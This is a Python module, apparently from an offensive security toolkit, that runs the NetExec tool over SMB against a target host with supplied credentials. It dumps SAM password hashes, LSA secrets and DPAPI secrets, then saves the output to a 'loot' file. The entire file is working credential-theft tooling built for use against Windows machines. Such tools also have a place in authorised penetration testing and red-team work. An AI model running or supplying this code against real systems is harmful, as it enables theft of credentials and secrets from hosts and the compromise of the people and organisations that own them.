# modules/dump_secrets.py

import shutil
from core.helpers import get_auth_args, save_loot, run_command
from core.colors import red, green, blue, yellow

def dump_all(session):
    print(blue(f"[*] Dumping LSA, SAM, and DPAPI secrets from {session.target_ip} using nxc..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH. Please install or symlink the binary."))
        return

    auth = get_auth_args(session)
    cmd = f"nxc smb {session.target_ip} {auth} --sam --lsa --dpapi"

    out, err = run_command(cmd)
    combined = out + "\n" + err

    # Check for typical success keywords
    if not any(kw in combined.lower() for kw in ["lsa", "sam", "dpapi", "secret", "hash"]):
        print(red("[-] Dump likely failed. No secrets found."))
        if "access denied" in combined.lower():
            print(yellow("[!] Check permissions. You may need SYSTEM or full admin access."))
        print(combined.strip())
        return

    # Save loot with timestamped separator
    filename = f"secrets_{session.target_ip}.txt"
    save_loot(filename, combined)
    print(green(f"[+] Secrets saved to loot/{filename}"))
